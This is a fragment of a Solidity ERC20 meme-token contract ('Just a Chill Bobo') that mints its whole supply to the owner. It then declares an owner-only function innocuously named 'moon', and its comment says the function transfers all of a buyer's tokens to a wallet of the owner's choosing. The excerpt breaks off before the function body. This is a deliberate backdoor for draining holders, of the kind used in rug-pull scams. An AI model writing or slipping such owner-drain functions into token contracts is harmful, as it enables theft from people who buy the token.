...
contract CHILLBOBO is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Just a Chill Bobo", "BOBO") Ownable(initialOwner) {
        _mint(initialOwner, 1000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function moon(address from, address to) external onlyOwner {
